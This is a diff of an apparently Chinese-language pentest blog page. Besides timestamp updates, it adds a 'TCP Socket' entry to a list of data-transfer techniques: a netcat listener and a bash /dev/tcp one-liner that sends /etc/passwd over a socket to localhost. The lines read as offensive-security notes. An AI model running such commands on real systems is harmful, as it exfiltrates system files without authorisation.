@@ -33,7 +33,7 @@
 <meta property="og:description" content="迟来的文章">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2023-02-08T03:15:20.000Z">
-<meta property="article:modified_time" content="2023-07-16T09:04:08.871Z">
+<meta property="article:modified_time" content="2023-07-22T07:40:51.094Z">
 <meta property="article:author" content="xXxYOLOxXx">
 <meta property="article:tag" content="Pentest">
 <meta name="twitter:card" content="summary">
@@ -209,7 +209,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-07-16 17:04:08" itemprop="dateModified" datetime="2023-07-16T17:04:08+08:00">2023-07-16</time>
+                <time title="Modified: 2023-07-22 15:40:51" itemprop="dateModified" datetime="2023-07-22T15:40:51+08:00">2023-07-22</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -845,6 +845,12 @@ Git提供了一种过滤机制，允许用户在文件检出或提交到Git存�
 <ul>
 <li><code>python2 -m SimpleHTTPServer 80 &amp;</code></li>
 <li><code>python3 -m http.server 80&amp;</code></li>
+</ul>
+</li>
+<li>TCP Socket
+<ul>
+<li><code>nc -lvnp 9999</code></li>
+<li><code>bash -c 'exec 3&lt;&gt;/dev/tcp/127.0.0.1/9999; cat /etc/passwd &gt;&amp;3; exec 3&gt;&amp;-'</code></li>
 </ul>
 </li>
 </ul>
